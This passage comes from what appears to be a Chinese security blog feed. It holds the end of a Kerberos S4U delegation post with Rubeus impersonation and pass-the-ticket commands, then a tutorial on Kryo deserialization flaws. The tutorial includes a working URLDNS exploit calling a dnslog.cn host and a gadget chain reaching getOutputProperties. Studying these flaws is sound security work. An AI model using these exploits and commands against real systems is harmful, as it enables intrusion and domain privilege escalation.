s4u /user:dm2008$ /rc4:b5cffac3d2bb5d5a7ded8ff2a70c29dc /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br><span class="line"></span><br><span class="line">//这里获取的hash值是dm2008$这个机器的</span><br><span class="line">能psexec登录到dm2008的控制台后 我们就可以来获取hash值了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230927195506176.png" alt="image-20230927195506176"></p><p>也就是说账户不可委派以及受保护组的成员是不影响S4U2Self的，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，<strong>可以看到该票据是没有服务名称的</strong>，并且不可转发(<strong>就是不可以执行ptt  不能注入到本地)</strong></p><p><strong>注：</strong> 如果该账户设置了<code>TrustedToAuthForDelegation</code>为True，则S4U2Self生成的票据是可转发的，默认为False</p><p><img src="../images/image-20230927195626598.png" alt="image-20230927195626598"></p><p>那么我们使用下面的这两个命令来添加SPN就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:cifs/dm2008 /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:test.kirbi /altservice:host/dm2008 /ptt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_44159028/article/details/124118253&quot;&gt;参考文章1—CSDN&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/7454&quot;&gt;参考文章2—</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Java-Kryo反序列化</title>
    <link href="https://ke1nys.github.io/posts/f0050380.html"/>
    <id>https://ke1nys.github.io/posts/f0050380.html</id>
    <published>2023-09-19T11:48:38.000Z</published>
    <updated>2023-09-25T07:41:06.411Z</updated>
    
    <content type="html"><![CDATA[<p>在网上看文章得时候  无意中看到这个Kryo反序列化  于是就写这篇文章来学习一下</p><p><a href="https://kaikaix.github.io/2023/09/07/kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">参考文章1</a>    <a href="https://github.com/p4d0rn/Java_Zoo/blob/2766f312d34c1267fee76c6e1a749d657d412c69/Deserial/Kryo.md">参考文章2</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Kryo 是一个快速序列化/反序列化工具，其使用了字节码生成机制。Kryo 序列化出来的结果，是其自定义的、独有的一种格式，不再是 JSON 或者其他现有的通用格式；而且，其序列化出来的结果是二进制的（即 byte[]；而 JSON 本质上是字符串 String），<strong>序列化、反序列化时的速度也更快</strong> (<strong>一个优点</strong>)。</p><p><strong>其相对于其他反序列化类的特点是可以使用它来序列化或反序列化任何Java类型，而不需要实现Serializable。</strong>(这就是这个类得特殊之处了)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.esotericsoftware<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先写个demo来进行分析</p><p><strong>MyClass.java</strong>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String hello;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClass&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;hello=&#x27;&quot;</span> + hello + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, num=&quot;</span> + num +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHello</span><span class="params">(String hello)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hello = hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>demo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(MyClass.class);</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        myClass.setHello(<span class="string">&quot;nihao&quot;</span>);</span><br><span class="line">        myClass.setNum(<span class="number">123</span>);</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        kryo.writeClassAndObject(output, myClass);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">myClass1</span> <span class="operator">=</span> (MyClass)kryo.readClassAndObject(input);</span><br><span class="line">        input.close();</span><br><span class="line">        System.out.println(myClass1);</span><br><span class="line">        <span class="comment">//将一个类当作字符串进行输出 会触发该类里的toString()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230924153830572.png" alt="image-20230924153830572"></p><p>成功进行序列化和反序列化操作  </p><p>这里进行选择的是<code>writeClassAndObject</code>和<code>readClassAndObject</code>  这两个类来进行序列化和反序列化</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><img src="../images/image-20230924191631796.png" alt="image-20230924191631796"></p><p>下个断点进行分析</p><p><img src="../images/image-20230924191707982.png" alt="image-20230924191707982"></p><p>然后在这里的话会进行已经注册的类进行获取  </p><p> <img src="../images/image-20230924192116625.png" alt="image-20230924192116625"></p><p>然后到这里的话就会新型序列化类的获取  然后将其进行序列化操作</p><p><img src="../images/image-20230924192225130.png" alt=""></p><p>这里的话就会使用<strong>递归</strong>来将值一步一步的进行写入</p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><img src="../images/image-20230924192524040.png" alt="image-20230924192524040"></p><p>反序列化也是一样  也是会进行已经注册的类的获取</p><p><img src="../images/image-20230924192622533.png" alt="image-20230924192622533"></p><p>然后就是进行序列化类的获取  这里都是使用默认的 <code>FieldSerializer</code> </p><p><img src="../images/image-20230924192720179.png" alt="image-20230924192720179"></p><p>然后就是开始反序列化读取之前序列化的内容了 </p><p><strong>这里的写的比较简略</strong></p><p>(其实在这个序列化器里的wirte和read方法里面还有更加细致的分析是怎么进行<strong>写入和读取的 </strong>     因为比较懒  这里就不写了)</p><h3 id="简略分析"><a href="#简略分析" class="headerlink" title="简略分析"></a>简略分析</h3><ol><li><strong>经过上述的分析知道了是得先获取这个注册类这个东西  如果不进行注册的话就会进行报错</strong></li></ol><p><img src="../images/image-20230924193119546.png" alt="image-20230924193119546"></p><p>就是序列化和反序列化需要用到的类  如果不在默认注册表里就会报错</p><p><img src="../images/image-20230924193411188.png" alt="image-20230924193411188"></p><p><img src="../images/image-20230924193219192.png" alt="image-20230924193219192"></p><p>这里就是会爆出这个错误</p><ol><li>还有一个就是使用这个kryo进行序列化和反序列化操作的话  因为经过上面简单的分析  我们发现每次进行序列化或者反序列化的时候  都是会先用到<code>FieldSerializer</code>这个类  当我们跟进这个类的时候  就会发现这个类调用的是一个无参方法  </li></ol><p>​        <img src="../images/image-20230924193957490.png" alt="image-20230924193957490"></p><p><img src="../images/image-20230924194203562.png" alt="image-20230924194203562"></p><p>关于这个问题  翻阅文档发现  在这个地方如果执行下面这个代码的话  就不会进行构造函数的调用  就不会发生上面一样的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kryo.setInstantiatorStrategy(<span class="keyword">new</span> <span class="title class_">DefaultInstantiatorStrategy</span>(<span class="keyword">new</span> <span class="title class_">StdInstantiatorStrategy</span>()));</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>这个<code>Kryo</code> 其实是和这个<code>Hessian</code>  差不多  问题都是出在这个<code>put</code>方法这里</p><p>经过上面的分析呢  我们知道是怎么个反序列化的过程  在使用<code>FieldSerializer</code>  进行反序列化<code>read</code>的时候呢  对于某些类的参数会采用不同的<code>Serializer</code>来进行反序列化读取</p><p>(如果我们传入的参数是<code>hashmap</code>类的话  那么在反序列化的时候就会使用<code>mapSerializer</code>进行反序列化  其中就会调用到<code>map.put()</code>这个函数  这就是我们的漏洞利用点了)</p><p>写个demo进行分析</p><p><strong>User.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hashMap.put(test,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>demo.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.register(User.class);</span><br><span class="line">        kryo.register(HashMap.class);</span><br><span class="line">        kryo.register(Test.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        u.setHashMap();</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        kryo.writeClassAndObject(output, u);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;file.bin&quot;</span>));</span><br><span class="line">        <span class="type">User</span> <span class="variable">o</span> <span class="operator">=</span> (User)kryo.readClassAndObject(input);</span><br><span class="line">        input.close();</span><br><span class="line">        o.getHashMap();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230924203625589.png" alt="image-20230924203625589"></p><p>先是进入到<code>FieldSerializer#read</code>  然后在进行filed的获取  然后根据<code>filed</code>是什么类 然后获取该类的反序列化类来进行反序列化输出结果</p><p><img src="../images/image-20230924203939849.png" alt="image-20230924203939849"></p><p>然后接着就会进入到反射参数类<code>ReflectField</code>的<code>read</code>方法里面</p><p><img src="../images/image-20230924204213255.png" alt="image-20230924204213255"></p><p>然后再次进行kryo的readobject中</p><p><img src="../images/image-20230924204244355.png" alt="image-20230924204244355"></p><p>这里的就会调用到这个<code>MapSerializer</code>来反序列化我们的<code>hashmap</code>参数了</p><p><img src="../images/image-20230924204325436.png" alt="image-20230924204325436"></p><p>在<code>MapSerializer</code>反序列化的过程中就会调用到这个<code>map.put()</code>方法了  因为我们的key可控  那么我们就可以将其视为反序列化的入口了</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>先去查看这个的原来的利用链</p><p><img src="../images/image-20230924204609239.png" alt="image-20230924204609239"></p><p>发现他是使用这个<code>HashMap.readobject()</code>来作为反序列化的入口  那么我们的这个Kryo刚好可以进行替代</p><p>(因为触发点都是这个<code>map.put()</code>  并且key可控)</p><p><img src="../images/image-20230924205134166.png" alt="image-20230924205134166"></p><p><img src="../images/image-20230924205434785.png" alt="image-20230924205434785"></p><p><code>put</code>的时候也能触发</p><p><strong>Test.java</strong>   —-&gt; <strong>利用链</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">        kryo.setRegistrationRequired(<span class="literal">false</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不放url的key是为了序列化的时候不触发dns</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://bug2o1.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v2, <span class="number">0</span>, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeClassAndObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readClassAndObject(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230924205706619.png" alt="image-20230924205706619"></p><p>这个exp比较特别的地方就是在这里了  第一次看的时候一脸懵逼  debug看了好一会才看明白</p><p><strong>(其实这里这个代码的目的就是为了给这个key赋值的   不是用这个put方法来进行赋值)</strong></p><p><img src="../images/image-20230924205908606.png" alt="image-20230924205908606"></p><p>这里的就是可以进行给key赋值</p><p><img src="../images/image-20230924210159859.png" alt="image-20230924210159859"></p><p>还有一点就是这个赋值这个地方  这里给table赋值的原因就是如果不适用<code>put</code>函数进行赋值的话  kryo在反序列化的时候就会中<code>table</code>数组中来获取这个<code>key</code></p><p><img src="../images/image-20230924210355699.png" alt="image-20230924210355699"></p><p><a href="https://xz.aliyun.com/t/9417#toc-2">在这篇文章中也讲到了这个table </a>   感兴趣的可以去看看’</p><p>那么这条链子就分析完了</p><h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p> 关于这个类的话  熟悉这个rome链子的应该会知道  这链子在里面就有利用到</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HotSwappableTargetSource.equals-&gt;XString.equals-&gt;POJONode.toString-&gt;SignedObject.getObject-&gt;POJONode.toString-&gt;getOutputProperties</span><br></pre></td></tr></table></figure><p>在这个之前  我们得先去了解一下这个<code>equals</code>是怎么获取到的   </p><p><img src="../images/image-20230924213351886.png" alt="image-20230924213351886"></p><p>先下个断点</p><p><img src="../images/image-20230924214423583.png" alt="image-20230924214423583"></p><p>一般来说是进不去这个判断来触发这个<code>equals()</code>方法的  是会进去到上面的if判断里</p><p><img src="../images/image-20230924214637433.png" alt="image-20230924214637433"></p><p>进入到这个判断里的原因是因为这个key和value的值不相等  于是就会进入到这个判断里  因为我们是想要进入这个<code>equals()</code>里  所以我们要使其key和value的值相等</p><p>然后就会进入到<code>HotSwappableTargetSource</code>的<code>equals()</code>里  </p><p><img src="../images/image-20230924220303214.png" alt="image-20230924220303214"></p><p><img src="../images/image-20230924220317542.png" alt="image-20230924220317542"></p><p>这里这两个参数就是在刚开始的时候进行赋值</p><p>这就是为什么要初始化两个<code>HotSwappableTargetSource</code>的原因</p><p><img src="../images/image-20230924220411359.png" alt="image-20230924220411359"></p><p><strong>Xstring#equals()来触发这个pojoNode()</strong></p><p><img src="../images/image-20230924220959646.png" alt="image-20230924220959646"></p><p>后面的话就是正常的PojoNode的toString来触发了  老生常谈了  就不多说了</p><blockquote><p>可能在看的时候大家就有个疑问就是为什么要是使用两个PojoNode来  并且还是了signobject来进行二次反序列化    之所以这样做的原因是因为在最后触发这个getOutputProperties的时候  里面有个属性_tfactory是transient的  Kryo并不能对其进行反序列化</p></blockquote><p>在文章开头的时候写到  在序列化或者反序列化的时候  都会第一个触发<code>FiledSerializer</code>这个类  那么我们如果想要使用别的类怎么办？</p><p><img src="../images/image-20230925153313301.png" alt="image-20230925153313301"></p><p>这个这个Kryo的jar包力就有很多类可以使用</p><p><strong>用法如下</strong></p><p><img src="../images/15.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">        kryo.register(MyClass.class,<span class="keyword">new</span> <span class="title class_">BeanSerializer</span>(kryo, MyClass.class));</span><br><span class="line"></span><br><span class="line">        <span class="type">MyClass</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">        s.setNum(<span class="number">10</span>);</span><br><span class="line">        s.setHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        kryo.writeObject(output,s);</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(Files.newInputStream(Paths.get(<span class="string">&quot;file.bin&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> kryo.readObject(input, MyClass.class);</span><br><span class="line">    &#125;</span><br><span 